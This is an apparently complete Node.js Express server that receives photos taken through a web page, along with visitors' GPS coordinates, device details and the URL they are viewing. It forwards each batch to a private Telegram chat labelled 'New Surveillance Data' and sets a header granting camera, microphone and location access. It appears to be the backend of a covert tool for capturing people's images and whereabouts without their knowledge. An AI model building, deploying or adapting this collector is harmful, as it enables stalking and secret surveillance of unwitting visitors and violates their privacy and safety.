require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Setup with webhook for Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(TELEGRAM_TOKEN);

// Trust proxy (Important for Render)
app.set('trust proxy', 1);

// Security headers for HTTPS
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});

// Multer setup
const upload = multer({
  dest: 'uploads/',
  limits: { fileSize: 10 * 1024 * 1024 }
});

// Ensure uploads directory exists
if (!fs.existsSync('uploads')) {
  fs.mkdirSync('uploads');
}

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));
app.use(express.static('public'));

// Health check endpoint for Render
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    telegram: TELEGRAM_TOKEN ? 'configured' : 'missing'
  });
});

// Main route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Test endpoint
app.get('/test', (req, res) => {
  res.json({
    message: 'Server is working',
    telegram_configured: !!TELEGRAM_TOKEN,
    chat_id_configured: !!TELEGRAM_CHAT_ID
  });
});

// Photo upload endpoint - ENHANCED
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  console.log('📸 Upload request received');
  
  try {
    if (!req.file) {
      console.error('❌ No photo file received');
      return res.status(400).json({ success: false, error: 'No photo uploaded' });
    }

    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Telegram not configured');
      return res.status(500).json({ success: false, error: 'Telegram not configured' });
    }

    const photoPath = req.file.path;
    console.log('📁 Photo saved at:', photoPath);

    // Parse data
    const locationData = req.body.location ? JSON.parse(req.body.location) : {};
    const browserData = req.body.browserInfo ? JSON.parse(req.body.browserInfo) : {};
    const pageUrl = req.body.pageUrl || 'Unknown';

    console.log('📍 Location:', locationData);
    console.log('🌐 Browser:', browserData.platform);

    // Create message
    let message = '📸 *New Surveillance Data*\n\n';
    
    if (pageUrl) {
      message += `🌐 *Viewing:*\n\`${pageUrl}\`\n\n`;
    }
    
    if (locationData.latitude) {
      message += `📍 *Location:*\n`;
      message += `Lat: \`${locationData.latitude}\`\n`;
      message += `Lng: \`${locationData.longitude}\`\n`;
      message += `Accuracy: ${locationData.accuracy}m\n\n`;
    } else {
      message += `📍 *Location:* Not Available\n\n`;
    }

    message += `💻 *Device Info:*\n`;
    message += `Platform: ${browserData.platform || 'Unknown'}\n`;
    message += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
    message += `Time: ${new Date(browserData.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n`;

    // Send photo to Telegram
    console.log('📤 Sending to Telegram...');
    
    await bot.sendPhoto(TELEGRAM_CHAT_ID, fs.createReadStream(photoPath), {
      caption: message,
      parse_mode: 'Markdown'
    });

    console.log('✅ Photo sent to Telegram');

    // Send location if available
    if (locationData.latitude && locationData.longitude) {
      await bot.sendLocation(
        TELEGRAM_CHAT_ID,
        locationData.latitude,
        locationData.longitude
      );
      console.log('✅ Location sent to Telegram');
    }

    // Delete uploaded file
    fs.unlinkSync(photoPath);
    console.log('🗑️ Temp file deleted');

    res.json({ 
      success: true, 
      message: 'Data sent to Telegram successfully',
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('❌ Error:', error);
    
    // Clean up file if exists
    if (req.file && fs.existsSync(req.file.path)) {
      fs.unlinkSync(req.file.path);
    }
    
    res.status(500).json({ 
      success: false, 
      error: error.message,
      details: error.toString()
    });
  }
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('Server Error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log('=================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`📱 Telegram: ${TELEGRAM_TOKEN ? '✅ Configured' : '❌ Missing'}`);
  console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'}`);
  console.log('=================================');
});
